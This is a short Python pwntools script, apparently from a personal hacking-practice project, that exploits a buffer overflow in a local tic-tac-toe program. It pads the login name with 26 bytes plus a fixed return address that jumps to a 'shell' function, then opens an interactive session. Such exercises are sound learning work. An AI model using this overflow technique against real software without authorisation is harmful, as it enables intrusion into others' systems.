# bof - overwrite return adr to funciton 'shell'
from pwn import *

elf = ELF('/mnt/c/Users/עמרי/Documents/GitHub/HackThisGame/tictactoe')
conn = process('/mnt/c/Users/עמרי/Documents/GitHub/HackThisGame/tictactoe')

#important values:
shell_adr = 0x08049336
write_amount = 26

#payload: 
payload = b'A'*write_amount + p32(shell_adr)
print(f"payload: {payload}")

#interact with program:

#choose to login
print(conn.recvuntil("type s:").decode())
conn.sendline("l")
# name: send payload
print(conn.recvuntil("10 chars!!):").decode())
conn.sendline(payload)
#password:
print(conn.recvuntil("100 chars!!):").decode())
conn.sendline("111")

#rest of prints
print(conn.recvuntil("login failed").decode())

print("now we jump to shell!")

conn.interactive()
